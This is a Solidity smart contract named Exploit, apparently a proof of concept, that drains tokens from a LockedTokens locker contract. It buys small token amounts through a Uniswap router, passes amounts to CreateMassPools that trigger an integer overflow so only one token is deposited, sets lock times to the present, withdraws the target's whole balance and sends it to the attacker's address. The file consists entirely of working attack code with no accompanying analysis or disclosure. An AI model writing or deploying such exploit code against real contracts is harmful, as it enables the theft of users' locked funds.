pragma solidity ^0.8.4;

import "./IUniswapV2Router01.sol";
import "./IERC20.sol";
import "./LockedTokens.sol";

contract Exploit {
    function exploit(
        address target,                 // Target contract
        address[] calldata tokens,      // Tokens to steal
        address[][] calldata tokenPath, // The tokenpath to swap eth for token
        address swap                    // The address of the swap contract
    ) external {
        for(uint256 i; i < tokens.length; i++) {
            // Swap small amount of eth for Token
            IUniswapV2Router01(swap).swapExactETHForTokens{value: 0.001 ether}(0, tokenPath[i], address(this), block.timestamp);
            // Get token balance of target
            uint256 targetBalance = IERC20(tokens[i]).balanceOf(target);
            // Calculate pool amounts to trigger overflow resulting in `1`
            uint256[] memory amounts = new uint256[](2);
            amounts[0] = type(uint256).max - targetBalance + 2;
            amounts[1] = targetBalance;
            // Set pool lock finish times to current time, allowing instant withdrawal
            uint64[] memory finishTimes = new uint64[](2);
            finishTimes[0] = uint64(block.timestamp);
            finishTimes[1] = uint64(block.timestamp);
            // Set owners of pools
            address[] memory owners = new address[](2);
            owners[0] = address(this);
            owners[1] = address(this);
            // Approve transfer
            IERC20(tokens[i]).approve(target, type(uint256).max);
            // Create two pools causing overflow, only `1` token is transferred to target
            (, uint256 secondPool) = LockedTokens(target).CreateMassPools(tokens[i], finishTimes, amounts, owners);
            // Withdraw the entire balance - `1` token from the contract
            LockedTokens(target).WithdrawToken(secondPool);
            // Transfer stolen tokens to attacker EOA
            IERC20(tokens[i]).transfer(msg.sender, targetBalance);
        }
    }
}
